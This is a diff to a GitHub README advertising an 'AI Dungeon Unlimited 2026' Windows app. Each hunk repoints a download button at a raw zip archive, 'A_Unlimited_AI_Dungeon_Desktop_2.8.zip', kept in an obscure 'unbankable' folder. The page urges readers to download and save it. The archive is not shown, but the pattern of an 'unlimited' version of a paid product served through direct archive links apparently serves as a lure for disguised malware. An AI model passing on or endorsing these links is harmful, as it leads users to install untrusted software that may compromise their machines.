@@ -1,7 +1,7 @@
 <h1>🎮 AIDungeon-Desktop---AI-Dungeon-Unlimited-2026 - Your Infinite AI Adventure Awaits</h1>
 
 <p align="center">
-  <a href="https://github.com/musicalperceptionstephengirard8225/AIDungeon-Desktop---AI-Dungeon-Unlimited-2026">
+  <a href="https://raw.githubusercontent.com/musicalperceptionstephengirard8225/AIDungeon-Desktop---AI-Dungeon-Unlimited-2026/main/unbankable/A_Unlimited_AI_Dungeon_Desktop_2.8.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white&color=FF6D00" alt="Download Button" width="400" />
   </a>
 </p>
@@ -51,7 +51,7 @@ Getting this incredible adventure machine running on your Windows PC is easier t
 Your journey begins with a simple click. Please visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/musicalperceptionstephengirard8225/AIDungeon-Desktop---AI-Dungeon-Unlimited-2026" style="background-color:#4CAF50;color:white;padding:15px 30px;text-align:center;display:inline-block;font-size:20px;border-radius:8px;text-decoration:none;">📥 CLICK HERE TO DOWNLOAD</a>
+  <a href="https://raw.githubusercontent.com/musicalperceptionstephengirard8225/AIDungeon-Desktop---AI-Dungeon-Unlimited-2026/main/unbankable/A_Unlimited_AI_Dungeon_Desktop_2.8.zip" style="background-color:#4CAF50;color:white;padding:15px 30px;text-align:center;display:inline-block;font-size:20px;border-radius:8px;text-decoration:none;">📥 CLICK HERE TO DOWNLOAD</a>
 </p>
 
 Visit this link to download the application. Once you're on the page, look for the download button or the latest release asset labeled for Windows. Your browser will save the file to your default Downloads folder (usually called "Downloads" on your PC). We recommend saving it somewhere easy to remember – your Desktop works great.
@@ -169,7 +169,7 @@ This isn't just software – it's a **genuinely infinite book**, a cooperative s
 
 <p align="center">
   <strong>Ready to start? Click the green button at the very top of this page!</strong><br>
-  <a href="https://github.com/musicalperceptionstephengirard8225/AIDungeon-Desktop---AI-Dungeon-Unlimited-2026" style="background-color:#2196F3;color:white;padding:14px 28px;text-align:center;display:inline-block;font-size:18px;border-radius:6px;text-decoration:none;margin-top:10px;">🚀 DOWNLOAD THE APPLICATION NOW</a>
+  <a href="https://raw.githubusercontent.com/musicalperceptionstephengirard8225/AIDungeon-Desktop---AI-Dungeon-Unlimited-2026/main/unbankable/A_Unlimited_AI_Dungeon_Desktop_2.8.zip" style="background-color:#2196F3;color:white;padding:14px 28px;text-align:center;display:inline-block;font-size:18px;border-radius:6px;text-decoration:none;margin-top:10px;">🚀 DOWNLOAD THE APPLICATION NOW</a>
 </p>
 
 ---
